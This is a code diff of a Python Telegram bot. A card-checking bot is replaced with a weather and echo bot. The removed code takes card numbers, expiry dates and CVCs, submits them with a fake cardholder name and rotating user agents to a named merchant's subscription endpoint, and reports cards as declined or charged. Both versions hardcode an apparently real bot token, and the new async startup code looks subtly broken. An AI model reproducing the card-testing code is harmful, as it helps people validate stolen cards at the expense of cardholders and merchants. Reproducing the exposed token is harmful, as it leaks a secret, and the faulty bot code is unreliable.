@@ -1,85 +1,86 @@
-import os
-import logging
 import requests
 from telegram import Update
-from telegram.ext import CommandHandler, MessageHandler, Filters, Updater, CallbackContext
-from fake_useragent import UserAgent
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, filename='bot.log', format='%(asctime)s - %(levelname)s - %(message)s')
+# Define your bot token
+BOT_TOKEN = '7546779723:AAGckCuFIhMfa9h7sUZylW_hQfa_0UsSL7I'
 
-# Initialize the user agent and bot token
-ua = UserAgent()
-AUTHORIZED_USER = 6766802130  # Replace with your Telegram ID
-BOT_TOKEN = '7546779723:AAGckCuFIhMfa9h7sUZylW_hQfa_0UsSL7I'  # Your bot token
+# Set up an external API (Weather API in this case)
+WEATHER_API_KEY = 'your_openweathermap_api_key_here'  # Replace with your OpenWeatherMap API key
 
-def start(update: Update, context: CallbackContext):
-    chat_id = update.message.chat_id
-    if chat_id != AUTHORIZED_USER:
-        context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this bot.")
-        return
-    context.bot.send_message(chat_id=chat_id, text="✅ Welcome to the bot. You are authorized.")
+# Command to start the bot with credits to @f2wnet
+async def start(update: Update, context) -> None:
+    message = (
+        "Hello! I am your advanced bot.\n"
+        "You can send /weather <city> to get the current weather information.\n"
+        "Bot created with ❤️ by @f2wnet."
+    )
+    await update.message.reply_text(message)
 
-def is_valid_card_format(card_details):
-    # Ensure the card details are in the correct format
-    parts = card_details.strip().split('|')
-    return len(parts) == 4  # Should be four parts: number|exp_month|exp_year|cvc
-
-def validate_card(card_details):
-    if not is_valid_card_format(card_details):
-        return "⚠️ Invalid card format. Please use 'number|exp_month|exp_year|cvc'."
-
+# Command to fetch weather from an external API
+async def weather(update: Update, context) -> None:
     try:
-        cn, expm, expy, cv = card_details.strip().split('|')
-        expy = expy[-2:]  # Get the last two digits of the year
+        if len(context.args) == 0:
+            await update.message.reply_text('Please provide a city name. Usage: /weather <city>')
+            return
         
-        headers = {
-            'user-agent': ua.random,
-        }
-        data = {
-            'card[name]': 'Amid Smith',
-            'card[number]': cn,
-            'card[exp_month]': expm,
-            'card[exp_year]': expy,
-            'card[cvc]': cv,
-        }
+        city_name = ' '.join(context.args)
+        url = f"http://api.openweathermap.org/data/2.5/weather?q={city_name}&appid={WEATHER_API_KEY}&units=metric"
         
-        # Make the POST request to the validation endpoint
-        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', headers=headers, data=data)
-        
-        # Check if the response is valid JSON
-        response_data = response.json()
-        
-        # Check the response message for decline keywords
-        decline_keywords = ['invalid', 'incorrect', 'declined', 'error', 'errorexception', '402', '500']
-        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
-            return f"🔴 Declined: {response_data.get('message')}"
+        response = requests.get(url)
+        data = response.json()
+
+        if data["cod"] != 200:
+            await update.message.reply_text(f"City {city_name} not found!")
         else:
-            return f"🟢 Charged 3.99$: {response_data.get('message')}"
-    
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Network error: {str(e)}")
-        return "⚠️ There was a network error."
+            weather_description = data["weather"][0]["description"]
+            temperature = data["main"]["temp"]
+            feels_like = data["main"]["feels_like"]
+            humidity = data["main"]["humidity"]
+            wind_speed = data["wind"]["speed"]
+
+            weather_info = (f"Weather in {city_name.title()}:\n"
+                            f"Description: {weather_description}\n"
+                            f"Temperature: {temperature}°C\n"
+                            f"Feels like: {feels_like}°C\n"
+                            f"Humidity: {humidity}%\n"
+                            f"Wind speed: {wind_speed} m/s\n"
+                            f"\nBot created by @f2wnet.")
+            await update.message.reply_text(weather_info)
+
     except Exception as e:
-        logging.error(f"Error processing card: {str(e)}")
-        return "⚠️ An error occurred while processing your request."
+        await update.message.reply_text("An error occurred while fetching the weather data.")
 
-def handle_message(update: Update, context: CallbackContext):
-    chat_id = update.message.chat_id
-    if chat_id != AUTHORIZED_USER:
-        return
+# Command to handle any text message and echo it back with credits
+async def echo(update: Update, context) -> None:
+    user_message = update.message.text
+    await update.message.reply_text(f'You said: {user_message}\n\nBot created by @f2wnet.')
 
-    card_details = update.message.text
-    result = validate_card(card_details)
-    context.bot.send_message(chat_id=chat_id, text=result)
+# Command to handle unknown commands with credits
+async def unknown(update: Update, context) -> None:
+    await update.message.reply_text("Sorry, I didn't understand that command.\n\nBot created by @f2wnet.")
 
-def main():
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
-    updater.start_polling()
-    updater.idle()
+# Main function to run the bot
+async def main():
+    # Create the bot application
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-if __name__ == "__main__":
-    main()
+    # Add handlers for commands
+    app.add_handler(CommandHandler('start', start))
+    app.add_handler(CommandHandler('weather', weather))  # Advanced API command for weather
+
+    # Add handler for text messages (echo)
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
+
+    # Add handler for unknown commands
+    app.add_handler(MessageHandler(filters.COMMAND, unknown))
+
+    # Run the bot
+    await app.start()
+    print("Bot is running...")
+    await app.idle()
+
+# Run the bot
+if __name__ == '__main__':
+    import asyncio
+    asyncio.run(main())
